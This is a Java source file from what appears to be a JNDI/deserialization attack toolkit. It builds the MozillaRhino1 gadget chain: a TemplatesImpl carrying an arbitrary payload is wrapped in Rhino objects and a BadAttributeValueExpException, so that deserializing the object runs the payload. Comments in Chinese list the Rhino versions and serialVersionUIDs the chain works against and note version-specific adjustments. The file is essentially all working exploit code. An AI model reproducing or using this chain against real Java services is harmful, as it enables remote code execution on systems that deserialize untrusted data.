package sonomon.jndi.deser.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import javax.management.BadAttributeValueExpException;
import org.mozilla.javascript.Context;
import org.mozilla.javascript.IdScriptableObject;
import org.mozilla.javascript.NativeJavaMethod;
import org.mozilla.javascript.NativeJavaObject;
import org.mozilla.javascript.NativeObject;
import org.mozilla.javascript.ScriptableObject;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;
import sonomon.jndi.deser.Reflections;

//rhino-1.7.15/1.7.14/1.7.14-RC1
//反序列化链失效，org.mozilla.javascript.ScriptableObject$GetterSlot更换为org.mozilla.javascript.AccessorSlot，它的getter属性不再是泛型且被transient修饰。
//
//
//MozillaRhino1
//rhino-1.7.13/1.7.12/1.7.11/1.7.11-RC2/1.7.11-RC1
//相比原MozillaRhino1链，ScriptableObject.getSlot()要替换为SlotMapContainer.query()
//IdScriptableObject serialVersionUID = -3744239272168621609
//
//
//rhino-1.7.10/1.7.9/1.7.8/1.7.8-RC1
//相比原MozillaRhino1链，ScriptableObject.getSlot()要替换为SlotMapContainer.query()
//IdScriptableObject serialVersionUID = -5369348712865339116
//
//rhino-1.7.7.2
//ScriptableObject.getSlot()参数类型有变化，一些属性也有变化
//IdScriptableObject serialVersionUID = -5369348712865339116
//
//rhino-1.7.7.1/1.7.7/1.7.6
//IdScriptableObject serialVersionUID = 4443385177316171368
//
//rhino-1.7R5/1.7R4
//IdScriptableObject serialVersionUID = -4961209649237988891
//
//rhino-1.7R3
//IdScriptableObject serialVersionUID = -8305344746752490335
//ScriptableObject serialVersionUID = 2829861078851942586
//
//js-1.7R2
//ScriptableObject serialVersionUID = 7335823325303937252
//
//<=js-1.7R1
//由于BaseFunction/NativeObject/NativeError的tag属性都使用了new Object()，导致无法序列化，且ClassCache不再实现Serializable。
	
	public class MozillaRhino1 implements SerializeObject{
		public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
			byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
			return bs;
		}
		public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
		//默认1.7R4,仅rhino-1.7R5/1.7R4可反序列化成功,由于rhino小版本之间变化较大,很难用加载jar或者修改sUID做出通用payload,建议实时生成1.ser

		Class       nativeErrorClass       = Class.forName("org.mozilla.javascript.NativeError");
		Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
		Reflections.setAccessible(nativeErrorConstructor);
		IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

		Context context = Context.enter();
		NativeObject scriptableObject = (NativeObject) context.initStandardObjects();

		Method           enterMethod = Context.class.getDeclaredMethod("enter");
		NativeJavaMethod method      = new NativeJavaMethod(enterMethod, "name");
		idScriptableObject.setGetterOrSetter("name", 0, method, false);

		Method           newTransformer   = TemplatesImpl.class.getDeclaredMethod("newTransformer");
		NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
		idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);
		
		Object slot = null;
		Method getSlot = null;
		try {
			try {
				getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
			} catch (Exception e) {
				getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", Object.class, int.class, int.class);
			}
			Reflections.setAccessible(getSlot);
			slot   = getSlot.invoke(idScriptableObject, "name", 0, 1);
		} catch (Exception e) {
			Object slotMapContainer  = Reflections.getFieldValue(idScriptableObject, "slotMap");
			Method query = slotMapContainer.getClass().getDeclaredMethod("query", Object.class, int.class);
			Reflections.setAccessible(query);
			slot = query.invoke(slotMapContainer, "name", 0);
		}
		
		Field  getter = slot.getClass().getDeclaredField("getter");
		Reflections.setAccessible(getter);

		Class       memberboxClass            = Class.forName("org.mozilla.javascript.MemberBox");
		Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
		Reflections.setAccessible(memberboxClassConstructor);
		Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
		getter.set(slot, memberboxes);

		NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, tempImpl, TemplatesImpl.class);
		idScriptableObject.setPrototype(nativeObject);

        // 生成 BadAttributeValueExpException 实例，用于反序列化触发 toString 方法
        BadAttributeValueExpException val = new BadAttributeValueExpException("xxx");
        Reflections.setFieldValue(val, "val", idScriptableObject);
        // 删除堆栈信息
        Deserialize.setFieldValue(val, "stackTrace", new StackTraceElement[0]);
        Deserialize.setFieldValue(val, "cause", null);
        Deserialize.setFieldValue(val, "suppressedExceptions", null);
        
        return val;
    }
	
	
}